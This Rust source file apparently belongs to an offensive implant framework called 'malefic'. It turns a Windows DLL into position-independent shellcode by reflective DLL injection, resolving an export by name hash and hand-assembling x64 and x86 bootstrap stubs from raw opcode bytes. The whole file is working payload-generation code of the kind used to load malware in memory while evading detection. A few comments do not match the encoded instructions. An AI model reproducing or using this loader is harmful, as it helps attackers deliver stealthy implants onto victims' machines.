use goblin::pe::PE;

use crate::GenerateArch;

use super::{shellcode::{MALEFIC_RDI_SHELLCODE_32, MALEFIC_RDI_SHELLCODE_64}, utils::{hash_function_name, pack}};

pub fn malefic_shellcode_rdi_from_bytes(
    arch: &GenerateArch,
    dll_bytes: &[u8],
    function_name: &str,
    user_data: &[u8]
) -> Result<Vec<u8>, String> {
    let flags = 0;
    let mut function_hash = 0;
    if !function_name.is_empty() {
        function_hash = hash_function_name(function_name);
    }
    let pe = match PE::parse(dll_bytes) {
        Ok(pe) => pe,
        Err(e) => {
            return Err(e.to_string());
        }
    };

    let mut function_offset = 0;
    if function_hash.ne(&0) {
        for func in pe.exports {
            match func.name {
                Some(name) => {
                    if hash_function_name(name).eq(&function_hash) {
                        function_offset = func.rva;
                        break;
                    }
                },
                None => {
                    continue;
                }
            }
        }
    }
    match arch {
        GenerateArch::X64 => {
            convert_to_x86_64_shellcode(
                dll_bytes, 
                function_offset as _, 
                user_data, 
                flags
            )
        }
        GenerateArch::X86 => {
            convert_to_x86_shellcode(
                dll_bytes, 
                function_offset as _, 
                user_data, 
                flags
            )
        }
    }
}


pub fn convert_to_x86_64_shellcode(
    dll_bytes: &[u8],
    entrypoint_offset: u32,
    user_data: &[u8],
    _flags: u32
) -> Result<Vec<u8>, String> {
    let mut final_shellcode: Vec<u8> = Vec::new();
    // let bootstrap_size = 35;
    let bootstrap_size = 53;
    let dll_offset = MALEFIC_RDI_SHELLCODE_64.len() + bootstrap_size;
    let mut bootstrap = Vec::new();

    bootstrap.extend_from_slice(&[0xe8, 0x00, 0x00, 0x00, 0x00]);
    bootstrap.extend_from_slice(&[0x59]);
    // add rcx, dll_offset
    bootstrap.extend_from_slice(b"\x48\x81\xc1");
    bootstrap.extend_from_slice(&pack(dll_offset as u32));
    // mov edx, entry_func_offset
    bootstrap.extend_from_slice(b"\xba");
    bootstrap.extend_from_slice(&pack(entrypoint_offset as u32));
    // mov r8, user_data
    bootstrap.extend_from_slice(b"\x49\x81\xc0");
    let user_data_location = dll_offset + dll_bytes.len();
    bootstrap.extend_from_slice(&pack(user_data_location as u32));
    // mov r9, user_data_len
    bootstrap.extend_from_slice(b"\x41\xb9");
    bootstrap.extend_from_slice(&pack(user_data.len() as u32));
    // push rsi
    bootstrap.push(b'\x56');
    // mov rsi, rsp
    bootstrap.extend_from_slice(b"\x48\x89\xe6");
    // and rsp, 0xfffffffffffffff0 
    bootstrap.extend_from_slice(b"\x48\x83\xe4\xf0");
    // sub rsp, 0x30
    bootstrap.extend_from_slice(b"\x48\x83\xec\x20");
    // call 0x23 -> bootstrap -> rdi
    bootstrap.push(b'\xe8');
    // bootstrap.push(5 as u8);
    let remainder_of_instructions = bootstrap_size - bootstrap.len() - 4;
    bootstrap.extend_from_slice(&[remainder_of_instructions as u8]);
    bootstrap.extend_from_slice(b"\x00\x00\x00");
    // mov rsp, rsi
    bootstrap.extend_from_slice(b"\x48\x89\xf4");
    // pop rsi
    bootstrap.push(b'\x5e');
    // pop ret
    bootstrap.push(b'\xc3');
    bootstrap.extend_from_slice(b"\xe9\xe7\x1c\x00\x00");

    final_shellcode.extend_from_slice(&bootstrap);
    final_shellcode.extend_from_slice(MALEFIC_RDI_SHELLCODE_64);
    final_shellcode.extend_from_slice(dll_bytes);
    final_shellcode.extend_from_slice(user_data);

    Ok(final_shellcode)
}

pub fn convert_to_x86_shellcode(
    dll_bytes: &[u8],
    entrypoint_offset: u32,
    user_data: &[u8],
    _flags: u32
) -> Result<Vec<u8>, String> {
    let mut final_shellcode: Vec<u8> = Vec::new();
    let bootstrap_size = 40;
    let mut bootstrap = Vec::new();
    bootstrap.extend_from_slice(&[0xe8, 0x00, 0x00, 0x00, 0x00]);
    let dll_offset = MALEFIC_RDI_SHELLCODE_32.len() + bootstrap_size;
    // pop eax
    bootstrap.extend_from_slice(&[0x58]);
    // mov ebx, eax
    bootstrap.extend_from_slice(&[0x89, 0xc3]);
    // add eax, dll_offset
    bootstrap.extend_from_slice(&[0x05]);
    bootstrap.extend_from_slice(&pack(dll_offset as u32));
    // push user_data len
    bootstrap.extend_from_slice(&[0x68]);
    bootstrap.extend_from_slice(&pack(user_data.len() as u32));
    // add ebx, dll_offset + dll_size
    bootstrap.extend_from_slice(&[0x81, 0xc3]);
    let user_data_location = dll_offset + dll_bytes.len();
    bootstrap.extend_from_slice(&pack(user_data_location as u32));
    // push user_data
    bootstrap.extend_from_slice(&[0x53]);
    // push entrypoint_offset
    bootstrap.extend_from_slice(&[0x68]);
    bootstrap.extend_from_slice(&pack(entrypoint_offset as u32));
    // push eax
    bootstrap.extend_from_slice(&[0x50]);

    bootstrap.extend_from_slice(&[0xe8]);
    let remainder_of_instructions = bootstrap_size - bootstrap.len() - 4;
    bootstrap.extend_from_slice(&[remainder_of_instructions as u8]);
    bootstrap.extend_from_slice(b"\x00\x00\x00");
    bootstrap.extend_from_slice(b"\x83\xc4\x10");
    bootstrap.push(b'\xc3');
    bootstrap.extend_from_slice(b"\xe9\xcd\x11\x00\x00");

    final_shellcode.extend_from_slice(&bootstrap);
    final_shellcode.extend_from_slice(MALEFIC_RDI_SHELLCODE_32);
    final_shellcode.extend_from_slice(dll_bytes);
    final_shellcode.extend_from_slice(user_data);

    Ok(final_shellcode)
}